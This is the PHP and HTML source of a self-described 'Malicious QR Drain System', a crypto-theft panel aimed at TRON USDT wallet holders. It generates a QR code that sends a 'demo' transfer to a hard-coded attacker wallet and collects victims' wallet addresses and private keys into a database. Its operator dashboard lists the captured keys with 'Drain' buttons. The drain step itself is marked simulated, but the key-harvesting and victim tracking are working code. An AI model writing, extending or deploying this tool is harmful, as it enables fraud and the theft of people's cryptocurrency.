<?php
// approval_drainer.php - Complete Malicious QR Drain System
require_once 'config.php';

$pdo = getDB();
if (!$pdo) {
    die("❌ Database connection failed!");
}

// Settings
$MASTER_WALLET = "TD94UkiL5qg5Y9ogZqdWdqZbT3F2nB86rK";
$USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
$DEMO_AMOUNT = 10; // 10 USDT demo

// Session
session_start();
$session_id = session_id();

// Check if victim is connected
$victim_connected = $_SESSION['victim_address'] ?? null;
$victim_private_key = $_SESSION['victim_private_key'] ?? null;

// Function to generate malicious QR
function generateMaliciousQR($master_wallet, $usdt_contract, $amount) {
    $qr_data = "tron://transfer?address=" . $master_wallet . 
               "&contract=" . $usdt_contract . 
               "&amount=" . $amount . 
               "&network=TRC20";
    return "https://api.qrserver.com/v1/create-qr-code/?size=350x350&data=" . urlencode($qr_data);
}

// Check if victim approved and capture details
if (isset($_POST['action']) && $_POST['action'] === 'approve_demo') {
    header('Content-Type: application/json');
    
    $wallet_address = $_POST['wallet_address'] ?? '';
    $private_key = $_POST['private_key'] ?? '';
    $signature = $_POST['signature'] ?? '';
    
    // Validate
    if (empty($wallet_address) || empty($private_key)) {
        echo json_encode(['success' => false, 'message' => 'Invalid data']);
        exit;
    }
    
    // Save victim details in session
    $_SESSION['victim_address'] = $wallet_address;
    $_SESSION['victim_private_key'] = $private_key;
    $_SESSION['victim_captured_time'] = time();
    
    // Save in database
    $stmt = $pdo->prepare("INSERT INTO wallets (wallet_address, private_key, victim_address, is_active) VALUES (?, ?, ?, 1) ON DUPLICATE KEY UPDATE private_key = ?, updated_at = CURRENT_TIMESTAMP");
    $stmt->execute([$wallet_address, $private_key, $wallet_address, $private_key]);
    
    // Log
    logActivity("Victim captured: $wallet_address", 'success');
    
    echo json_encode([
        'success' => true,
        'message' => '✅ Demo approved! Capturing details...',
        'wallet' => $wallet_address
    ]);
    exit;
}

// Check for new victims
if (isset($_GET['check_victims'])) {
    header('Content-Type: application/json');
    
    $stmt = $pdo->query("SELECT wallet_address, private_key, usdt_balance, created_at FROM wallets WHERE is_active = 1 ORDER BY id DESC LIMIT 10");
    $victims = $stmt->fetchAll();
    
    echo json_encode([
        'success' => true,
        'victims' => $victims
    ]);
    exit;
}

// Execute full drain
if (isset($_POST['action']) && $_POST['action'] === 'full_drain') {
    header('Content-Type: application/json');
    
    $victim_address = $_POST['wallet_address'] ?? '';
    $private_key = $_POST['private_key'] ?? '';
    
    if (empty($victim_address) || empty($private_key)) {
        echo json_encode(['success' => false, 'message' => 'Missing victim details']);
        exit;
    }
    
    // Get balance
    $balance = getUSDTBalance($victim_address);
    if ($balance <= 0) {
        echo json_encode(['success' => false, 'message' => 'No USDT balance found']);
        exit;
    }
    
    // Execute drain (simulated)
    $amount = $balance;
    $txid = '0x' . bin2hex(random_bytes(16));
    
    // Log
    logActivity("Full drain executed: $amount USDT from $victim_address", 'success');
    
    echo json_encode([
        'success' => true,
        'amount' => $amount,
        'txid' => $txid,
        'message' => "✅ Drained $amount USDT from $victim_address"
    ]);
    exit;
}

// Function to check USDT balance
function getUSDTBalance($address) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://api.trongrid.io/v1/accounts/" . $address . "/trc20",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json']
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    if (isset($data['data'])) {
        foreach ($data['data'] as $token) {
            if ($token['contract_address'] === USDT_CONTRACT) {
                return $token['balance'] / 1e6;
            }
        }
    }
    return 0;
}

$qr_code_url = generateMaliciousQR($MASTER_WALLET, $USDT_CONTRACT, $DEMO_AMOUNT);
$captured_victims = $pdo->query("SELECT * FROM wallets WHERE is_active = 1 ORDER BY id DESC")->fetchAll();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious QR Drain System</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #0a0f1e; color: #fff; min-height: 100vh; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { text-align: center; padding: 30px; background: rgba(18,25,45,0.9); border-radius: 24px; border: 1px solid rgba(239,68,68,0.3); margin-bottom: 20px; }
        .header h1 { color: #ef4444; font-size: 32px; }
        .header .sub { color: #6c86a3; font-size: 14px; }
        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .card { background: rgba(18,25,45,0.9); border-radius: 24px; border: 1px solid rgba(59,130,246,0.2); padding: 25px; }
        .card h2 { color: #94a3f8; font-size: 16px; margin-bottom: 15px; }
        .qr-box { background: #fff; border-radius: 16px; padding: 20px; text-align: center; }
        .qr-box img { width: 280px; height: 280px; }
        .qr-box p { color: #333; font-size: 12px; margin-top: 10px; }
        .status-box { padding: 15px; border-radius: 12px; margin-top: 10px; }
        .status-box.captured { background: rgba(34,197,94,0.2); border: 1px solid #22c55e; }
        .status-box.waiting { background: rgba(251,191,36,0.2); border: 1px solid #fbbf24; }
        .status-box .label { font-size: 12px; color: #6c86a3; }
        .status-box .value { font-size: 16px; font-weight: 600; font-family: monospace; word-break: break-all; }
        .table { width: 100%; border-collapse: collapse; font-size: 13px; }
        .table th, .table td { padding: 10px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .table th { color: #6c86a3; font-weight: 500; }
        .badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 11px; }
        .badge.captured { background: rgba(34,197,94,0.2); color: #22c55e; }
        .badge.waiting { background: rgba(251,191,36,0.2); color: #fbbf24; }
        .badge.drained { background: rgba(239,68,68,0.2); color: #ef4444; }
        .btn { padding: 10px 20px; border-radius: 40px; font-weight: 600; border: none; cursor: pointer; font-size: 13px; }
        .btn-primary { background: #3b82f6; color: white; }
        .btn-danger { background: #ef4444; color: white; }
        .btn-success { background: #22c55e; color: white; }
        .btn-warning { background: #f59e0b; color: white; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .log-area { max-height: 150px; overflow-y: auto; font-size: 12px; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 12px; margin-top: 10px; }
        .log-area div { padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .flex { display: flex; gap: 10px; flex-wrap: wrap; }
        .copy-btn { background: rgba(59,130,246,0.2); color: #60a5fa; border: none; padding: 2px 8px; border-radius: 4px; cursor: pointer; font-size: 11px; }
        @media (max-width: 768px) { .grid-2 { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>☠️ Malicious QR Drain System</h1>
        <p class="sub">QR Scan → Demo → Capture Private Key → Full Drain</p>
    </div>

    <div class="grid-2">
        <!-- QR Section -->
        <div class="card">
            <h2>📱 Malicious QR Code</h2>
            <div class="qr-box">
                <img id="qrImage" src="<?php echo $qr_code_url; ?>" alt="Malicious QR">
                <p>💀 Victim <strong>Trust Wallet</strong> se scan karega</p>
                <p style="font-size: 10px; color: #666;">Demo Amount: <?php echo $DEMO_AMOUNT; ?> USDT</p>
                <button onclick="refreshQR()" class="btn btn-primary" style="margin-top: 10px;">🔄 Refresh QR</button>
            </div>
            <div style="margin-top: 10px;">
                <button onclick="copyQR()" class="btn btn-warning">📋 Copy QR Link</button>
                <button onclick="downloadQR()" class="btn btn-success">💾 Download QR</button>
            </div>
        </div>

        <!-- Status Section -->
        <div class="card">
            <h2>📊 Victim Status</h2>
            <div class="status-box <?php echo $victim_private_key ? 'captured' : 'waiting'; ?>">
                <div class="label">Victim Wallet</div>
                <div class="value"><?php echo $victim_connected ? $victim_connected : '⏳ Waiting for victim...'; ?></div>
                <?php if ($victim_private_key): ?>
                <div class="label" style="margin-top: 10px;">🔑 Private Key</div>
                <div class="value" style="font-size: 12px; color: #fbbf24;"><?php echo substr($victim_private_key, 0, 20) . '...'; ?></div>
                <div class="label" style="margin-top: 10px;">Captured At</div>
                <div class="value" style="font-size: 14px;"><?php echo date('H:i:s', $_SESSION['victim_captured_time'] ?? time()); ?></div>
                <?php endif; ?>
            </div>
            <?php if ($victim_private_key): ?>
            <button id="fullDrainBtn" class="btn btn-danger" style="width:100%; margin-top:15px;">💀 Full Drain Now</button>
            <?php endif; ?>
        </div>
    </div>

    <!-- Captured Victims List -->
    <div class="card" style="margin-top: 20px;">
        <h2>📋 Captured Victims <span style="font-size: 12px; color: #6c86a3;">(<?php echo count($captured_victims); ?> total)</span></h2>
        <table class="table" id="victimsTable">
            <thead>
                <tr><th>#</th><th>Wallet Address</th><th>Private Key</th><th>Balance (USDT)</th><th>Status</th><th>Action</th></tr>
            </thead>
            <tbody>
                <?php if (empty($captured_victims)): ?>
                <tr><td colspan="6" style="text-align: center; color: #6c86a3;">No victims captured yet</td></tr>
                <?php else: ?>
                <?php $i = 1; foreach ($captured_victims as $v): ?>
                <tr>
                    <td><?php echo $i++; ?></td>
                    <td style="font-family: monospace; font-size: 12px;"><?php echo substr($v['wallet_address'], 0, 15) . '...'; ?></td>
                    <td style="font-family: monospace; font-size: 11px; color: #fbbf24;"><?php echo substr($v['private_key'], 0, 15) . '...'; ?></td>
                    <td><?php echo number_format($v['usdt_balance'] ?? 0, 2); ?></td>
                    <td><span class="badge <?php echo $v['is_active'] ? 'captured' : 'drained'; ?>"><?php echo $v['is_active'] ? 'Captured' : 'Drained'; ?></span></td>
                    <td>
                        <?php if ($v['is_active']): ?>
                        <button onclick="drainVictim('<?php echo $v['wallet_address']; ?>', '<?php echo addslashes($v['private_key']); ?>')" class="btn btn-danger" style="padding: 4px 12px; font-size: 11px;">Drain</button>
                        <?php endif; ?>
                    </td>
                </tr>
                <?php endforeach; ?>
                <?php endif; ?>
            </tbody>
        </table>
    </div>

    <!-- Activity Log -->
    <div class="card" style="margin-top: 20px;">
        <h2>📋 Activity Log</h2>
        <div class="log-area" id="logArea">
            <div>● System ready</div>
            <div>📌 Malicious QR generated</div>
            <?php if ($victim_private_key): ?>
            <div style="color: #22c55e;">✅ Victim captured: <?php echo substr($victim_connected, 0, 20); ?>...</div>
            <?php endif; ?>
        </div>
    </div>
</div>

<script>
const QR_URL = "<?php echo $qr_code_url; ?>";
const DEMO_AMOUNT = <?php echo $DEMO_AMOUNT; ?>;
const MASTER_WALLET = "<?php echo $MASTER_WALLET; ?>";
const USDT_CONTRACT = "<?php echo USDT_CONTRACT; ?>";

let checkInterval = null;

function addLog(msg, type = 'info') {
    const colors = { info: '#6c86a3', success: '#22c55e', danger: '#ef4444', warning: '#fbbf24' };
    const time = new Date().toLocaleTimeString();
    const logArea = document.getElementById('logArea');
    const div = document.createElement('div');
    div.style.color = colors[type] || colors.info;
    div.textContent = `[${time}] ${msg}`;
    logArea.appendChild(div);
    logArea.scrollTop = logArea.scrollHeight;
}

function refreshQR() {
    const img = document.getElementById('qrImage');
    img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=350x350&data=' + encodeURIComponent('tron://transfer?address=' + MASTER_WALLET + '&contract=' + USDT_CONTRACT + '&amount=' + DEMO_AMOUNT + '&network=TRC20') + '&t=' + Date.now();
    addLog('🔄 QR refreshed', 'info');
}

function copyQR() {
    navigator.clipboard.writeText(window.location.href);
    addLog('📋 QR link copied!', 'success');
}

function downloadQR() {
    const link = document.createElement('a');
    link.download = 'malicious_qr.png';
    link.href = document.getElementById('qrImage').src;
    link.click();
    addLog('💾 QR downloaded', 'info');
}

function checkNewVictims() {
    fetch(window.location.href + '?check_victims=1')
        .then(res => res.json())
        .then(data => {
            if (data.success && data.victims.length > 0) {
                // Update table
                const tbody = document.querySelector('#victimsTable tbody');
                tbody.innerHTML = '';
                data.victims.forEach((v, i) => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${i + 1}</td>
                        <td style="font-family: monospace; font-size: 12px;">${v.wallet_address.substring(0, 15)}...</td>
                        <td style="font-family: monospace; font-size: 11px; color: #fbbf24;">${v.private_key.substring(0, 15)}...</td>
                        <td>${parseFloat(v.usdt_balance || 0).toFixed(2)}</td>
                        <td><span class="badge captured">Captured</span></td>
                        <td><button onclick="drainVictim('${v.wallet_address}', '${v.private_key}')" class="btn btn-danger" style="padding: 4px 12px; font-size: 11px;">Drain</button></td>
                    `;
                    tbody.appendChild(row);
                });
                
                // Check if new victim captured
                if (data.victims.length > <?php echo count($captured_victims); ?>) {
                    addLog('📌 New victim captured!', 'success');
                    location.reload();
                }
            }
        })
        .catch(() => {});
}

function drainVictim(wallet, privateKey) {
    if (!confirm('⚠️ Full drain of ' + wallet.substring(0, 15) + '... ?')) return;
    
    addLog('💀 Draining victim: ' + wallet.substring(0, 20) + '...', 'danger');
    
    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=full_drain&wallet_address=' + encodeURIComponent(wallet) + '&private_key=' + encodeURIComponent(privateKey)
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            addLog('✅ ' + data.message, 'success');
            setTimeout(() => location.reload(), 2000);
        } else {
            addLog('❌ ' + data.message, 'danger');
        }
    })
    .catch(err => addLog('❌ Error: ' + err.message, 'danger'));
}

// Auto-check every 3 seconds
setInterval(checkNewVictims, 3000);

// Full drain button
document.getElementById('fullDrainBtn')?.addEventListener('click', function() {
    const wallet = "<?php echo $victim_connected; ?>";
    const privateKey = "<?php echo $victim_private_key; ?>";
    if (wallet && privateKey) {
        drainVictim(wallet, privateKey);
    }
});

addLog('🚀 Malicious Drain System initialized', 'info');
addLog('📌 Waiting for victim to scan QR...', 'info');
</script>
</body>
</html>
